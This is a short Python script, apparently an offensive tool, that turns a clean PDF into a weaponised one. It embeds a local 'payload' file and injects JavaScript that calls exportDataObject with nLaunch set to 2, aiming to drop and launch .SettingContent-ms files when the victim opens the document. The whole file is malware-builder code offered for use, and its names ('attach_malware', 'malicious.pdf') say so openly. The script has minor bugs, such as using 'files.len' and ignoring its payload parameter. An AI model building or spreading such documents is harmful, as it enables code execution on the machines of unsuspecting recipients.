from PyPDF2 import PdfFileWriter, PdfFileReader


def attach_malware(input_file, output_file, payload='payload3'):
	inp = PdfFileReader(open(input_file, 'rb'))
	out = PdfFileWriter()

	for page in range(inp.getNumPages()):
		out.addPage(inp.getPage(page))

	out.addAttachment('a-form', open('payload', 'rb'))

	script = 'var files = ["PutFile", "Decode", "Execute"]; for (var i = 0; i < files.len; i++) {this.exportDataObject({cName: files[i] + ".SettingContent-ms", nLaunch: 2,});}'
	out.addJS(script)

	outstream = open(output_file, "wb")
	out.write(outstream)

if __name__ == '__main__':
	in_file = str(input("Please enter the name of the input PDF file (e.g. clean.pdf): "))
	out_file = str(input("Please enter the name of the output PDF file (e.g. malicious.pdf): "))
	attach_malware(in_file, out_file)
